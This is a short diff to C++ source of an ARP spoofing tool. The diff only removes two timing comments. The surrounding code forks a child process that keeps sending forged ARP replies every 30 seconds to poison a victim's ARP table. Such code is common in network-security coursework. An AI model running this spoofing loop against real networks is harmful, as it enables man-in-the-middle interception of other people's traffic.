@@ -69,7 +69,6 @@ void getMACAddress(pcap_t* handle, Mac& senderMac, Ip& senderIp, Mac& attackerMa
 }
 
 void arpSpoof(pcap_t* handle, Mac senderMac, Mac attackerMac, Mac targetMac, Ip targetIp, Ip senderIp) {
-    // Target continuously sends arp reply to sender (approx. per 90 seconds)
 	// Create Child Process to Continuously Infect ARP Table of Sender
 	pid_t pid = fork();
 	if (pid <0) {
@@ -80,7 +79,7 @@ void arpSpoof(pcap_t* handle, Mac senderMac, Mac attackerMac, Mac targetMac, Ip 
 		while(true) { 
 			cout << "Infecting Sender's ARP Table\n";
 			sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
-			sleep(30); //30 secs will be enough, since target sends arp reply every 90 seconds
+			sleep(30);
 		}
 	}
 	else {
